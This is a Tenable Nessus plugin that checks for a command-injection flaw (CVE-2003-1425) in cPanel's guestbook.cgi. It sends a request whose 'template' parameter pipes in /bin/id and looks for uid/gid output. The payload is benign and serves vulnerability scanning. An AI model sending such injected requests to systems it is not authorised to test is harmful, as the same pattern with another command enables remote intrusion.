#
# (C) Tenable Network Security, Inc.
#

# *untested*
#
# Message-ID: <3E530C7A.9020608@scan-associates.net>
# From: pokleyzz <pokleyzz@scan-associates.net>
# To: bugtraq@securityfocus.org
# Subject: Cpanel 5 and below remote command execution and local root
#           vulnerabilities
# 


include("compat.inc");
 desc = "
cpanel is installed and does not properly filter user input.
A cracker may use this flaw to execute any command on your system.

Solution : Upgrade to cpanel 6.0
Risk factor : High";


if(description)
{
 script_id(11281);
 script_version ("$Revision: 1.13 $");

 script_cve_id("CVE-2003-1425");
 script_bugtraq_id(6882);
 script_xref(name:"OSVDB", value:"4220");
 
 script_name(english:"cPanel guestbook.cgi template Variable Arbitrary Command Execution");
 script_summary(english:"Executes /bin/id");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application on the remote host has a command execution\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The version of cPanel running on the remote host does not properly\n",
     "filter input to the 'template' parameter of '/guestbook.cgi'.  This\n",
     "could allow a remote attacker to execute arbitrary commands with the\n",
     "privileges of the web server."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2003-02/0279.html"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0087.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to cPanel 6.0 or later."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();
 
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


cmd[0] = "/usr/bin/id";
cmd[1] = "/bin/id";

port = get_http_port(default:80);

for (i=0; i<2; i++)
{
http_check_remote_code (
			unique_dir:"/cgi-sys",
			check_request:"/guestbook.cgi?user=cpanel&template=|" + cmd[i] + "|",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc,
			port:port
			);
}
